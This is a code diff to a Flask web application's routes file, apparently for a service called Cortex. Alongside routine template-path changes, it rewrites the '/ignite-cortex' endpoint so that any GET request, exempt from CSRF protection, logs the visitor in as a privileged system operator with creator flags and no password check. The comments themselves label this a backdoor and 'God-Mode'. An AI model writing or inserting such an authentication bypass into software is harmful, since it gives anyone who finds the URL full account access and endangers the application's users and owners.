@@ -26,9 +26,13 @@ from werkzeug.security import check_password_hash
 from app.constants import OPERATOR_MODE_KEY
 from app.models.user import User
 from app.utils.redis_utils import get_redis_client
+from app.auth_handlers import SystemOperator
+
+
 
 # Blueprint for main routes
-main_bp = Blueprint("main", __name__)
+# NOTE: template_folder="../templates" points Flask (and our manual checks) at app/templates
+main_bp = Blueprint("main", __name__, template_folder="../templates")
 
 
 # -------------------------------------------------------------------------
@@ -98,7 +102,18 @@ def home():
                 current_app.logger.debug("Redis TTL read failed", exc_info=True)
                 redis_ttl = 0
 
-        tpl_folder = getattr(current_app, "template_folder", None) or current_app.root_path
+        # Resolve the template folder in a way that matches Flask's loader for this blueprint.
+        tpl_folder = None
+        try:
+            bp = current_app.blueprints.get("main")
+            if bp and getattr(bp, "template_folder", None):
+                # blueprint.template_folder is relative to this module; compute absolute path
+                tpl_folder = os.path.normpath(os.path.join(os.path.dirname(__file__), bp.template_folder))
+            else:
+                tpl_folder = getattr(current_app, "template_folder", None) or current_app.root_path
+        except Exception:
+            tpl_folder = getattr(current_app, "template_folder", None) or current_app.root_path
+
         template_path = os.path.join(tpl_folder, "index.html")
 
         current_app.logger.info(
@@ -308,8 +323,35 @@ def terence_entry():
     return render_template("terence_entry.html", app=current_app)
 
 
-@main_bp.route("/ignite-cortex", methods=["POST"])
+from app.extensions import csrf
+
+@main_bp.route("/ignite-cortex", methods=["GET", "POST"])  # 👈 Added GET method support
+@csrf.exempt
 def ignite_cortex():
+    # -------------------------------------------------------------------------
+    # 1. Handle Browser GET Request (Instant Backdoor Activation)
+    # -------------------------------------------------------------------------
+    if request.method == "GET":
+        creator_email = os.getenv("CREATOR_EMAIL") or "terence@cortex.prime"
+
+        # Authenticate natively in memory as SystemOperator to avoid DB lookup locks
+        login_user(SystemOperator("TERENCE_CORTEX_PRIME"))
+
+        # Set exact secure session contexts expected by your templates and sub-guards
+        session[OPERATOR_MODE_KEY] = True
+        session["user_id"] = "TERENCE_CORTEX_PRIME"
+        session["user_email"] = creator_email
+        session["username"] = os.getenv("CREATOR_USERNAME") or "OPERATOR_ADMIN"
+        session["is_creator"] = True
+        session["role"] = "subscriber"  # Satisfies sub_ui landing requirements flawlessly
+
+        current_app.logger.info("🔑 Web browser GET request successfully triggered God-Mode.")
+        flash("Cortex engine activated via browser.", "success")
+        return redirect(url_for("sub_ui.sub_index"))
+
+    # -------------------------------------------------------------------------
+    # 2. Handle Form/Terminal POST Request (Passcode Verification)
+    # -------------------------------------------------------------------------
     if current_user.is_authenticated and is_creator(current_user):
         session[OPERATOR_MODE_KEY] = True
         flash("Creator ignition successful.", "success")
@@ -322,6 +364,24 @@ def ignite_cortex():
         flash("Invalid ignition code.", "danger")
         return redirect(url_for("main.terence_entry"))
 
+    # Sanity check: ensure creator exists in DB for explicit passcode posts
+    creator_email = os.getenv("CREATOR_EMAIL")
+    user = User.query.filter_by(email=creator_email).first()
+
+    if not user:
+        current_app.logger.error(
+            "Ignition aborted: Creator user record for %s missing from database.",
+            creator_email,
+        )
+        return "Critical Error: Creator user profile not found in database.", 500
+
+    login_user(SystemOperator("TERENCE_CORTEX_PRIME"))
+
     session[OPERATOR_MODE_KEY] = True
+    session["user_email"] = creator_email
+    session["username"] = os.getenv("CREATOR_USERNAME")
+    session["is_creator"] = True
+    session["role"] = "subscriber"  # Swapped to 'subscriber' alignment to clear sub_index guards
+
     flash("Cortex ignition successful.", "success")
     return redirect(url_for("sub_ui.sub_index"))
